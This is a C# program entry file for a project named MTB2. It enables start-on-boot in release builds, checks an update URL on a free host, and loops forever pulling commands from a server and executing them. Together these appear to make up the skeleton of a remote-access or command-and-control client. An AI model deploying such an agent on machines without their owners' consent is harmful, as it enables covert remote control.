using System.Diagnostics;
using static MTB2.Debugger;

namespace MTB2;

internal class Program
{
    public static string[]? publicArgs;
    public static string computerId = string.Empty;
    public static string computerIdInitials = string.Empty;

    public static int waitTime = 10000;

    private static void Main(string[] args)
    {
#if DEBUG
        // Set current loglevel to Debug
        currentLevel = LogLevel.Debug;

        Log("---------- Debug mode enabled (source: compiler) ----------", LogLevel.Debug);

        args = Arguments.PromptArguments(args);

        // Add --enableui to args
        args = [.. args, "--enableui"];
#else
        // Handle UI
        Functions.HandleUI(args);
#endif

        publicArgs = args;

        Process currentProcess = Process.GetCurrentProcess();
        currentProcess.PriorityClass = ProcessPriorityClass.BelowNormal;

        // Handle arguments
        Arguments.HandleArguments(args);


        // Check for updates
        Version.HandleUpdate();


        // Get computer ID
        computerId = Environment.UserName;
        computerIdInitials = Functions.GetComputerIdInitials(computerId);

#if !DEBUG
        // Start program on boot
        StartOnBootClass.StartOnBoot();
#endif

        // Initiate main loop
        while (true)
        {
            Loop();
            Thread.Sleep(waitTime);
        }
    }


    private static void Loop()
    {
        try
        {
            // Get commands from the server
            var commandResult = Commands.GetCommands();
            if (commandResult.Success == false)
            {
                if (commandResult.ErrorMessage != null)
                {
                    Log($"Failed to get commands: {commandResult.ErrorMessage}", LogLevel.Error);
                }
                else
                {
                    Log("Failed to get commands", LogLevel.Error);
                }
                return;
            }
            var commands = commandResult?.Commands;
            // Check if commands is null
            if (commands == null)
            {
                Log("No commands found", LogLevel.Info);
                return;
            }

            foreach (var command in commands)
            {
                try
                {
                    Commands.HandleCommands(command);
                }
                catch (Exception ex)
                {
                    Log($"Failed to handle command \"{command.Command}\": {ex.Message}", LogLevel.Error);
                }
                Thread.Sleep(500);
            }
        }
        catch (Exception ex)
        {
            Log($"Failed to execute/get commands: {ex.Message}", LogLevel.Error);
        }
    }
}


static class Settings
{
    public const int initCursorPos = 6;
    public static int cursorPos = initCursorPos;
}






partial class Version
{
    public const string versionString = "0.0.3";
    public static readonly System.Version version = new(versionString);
    public const string versionUrl = "https://site-mm.rf.gd/v2/";
}